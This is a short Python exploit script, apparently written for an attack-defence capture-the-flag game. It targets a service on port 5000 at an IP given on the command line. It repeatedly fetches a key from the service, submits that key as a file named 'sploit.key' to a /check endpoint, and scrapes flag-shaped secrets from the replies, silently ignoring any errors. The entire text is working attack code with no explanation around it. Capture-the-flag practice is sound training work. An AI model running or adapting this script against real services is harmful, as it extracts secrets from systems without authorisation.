import requests
import sys
import re

DIFF = 20 # bigger -> chance higher, smaller -> less time 

if __name__ == "__main__":
    ip = sys.argv[1]
    url = f"http://{ip}:5000"
    for i in range(DIFF):
        try:
            r = requests.post(url)
            key = {'profile': ('sploit.key', r.text)}
            r = requests.post(f'{url}/check', files=key)
            result = re.findall(r'[A-Z0-9]{31}=', r.text)
            if result:
                print(result)
        except:
            pass